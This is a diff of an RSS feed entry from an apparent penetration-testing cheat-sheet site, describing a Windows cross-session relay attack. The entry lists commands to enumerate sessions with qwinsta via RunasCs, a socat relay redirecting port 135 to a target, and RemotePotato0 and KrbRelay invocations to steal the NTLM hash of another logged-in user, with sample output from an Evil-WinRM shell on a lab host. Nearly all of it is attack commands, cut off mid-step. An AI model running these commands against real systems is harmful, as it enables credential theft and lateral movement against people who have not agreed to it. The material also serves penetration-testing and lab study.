@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/cross_session_relay/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/cross_session_relay/</guid>
-      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; 2. Trigger auth request .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x &amp;lt;LOCAL_IP&amp;gt; -p &amp;lt;RELAY_PORT&amp;gt; Ref: RemotePotato0&#xA;1. All-in-one .\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.</description>
+      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 *Evil-WinRM* PS C:\Users\winrm_svc\Documents&amp;gt; .\RunasCs.exe x x qwinsta -l 9 SESSIONNAME USERNAME ID STATE TYPE DEVICE &amp;gt;services 0 Disc console tbrady 1 Active Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 2. Trigger auth request .</description>
     </item>
   </channel>
 </rss>
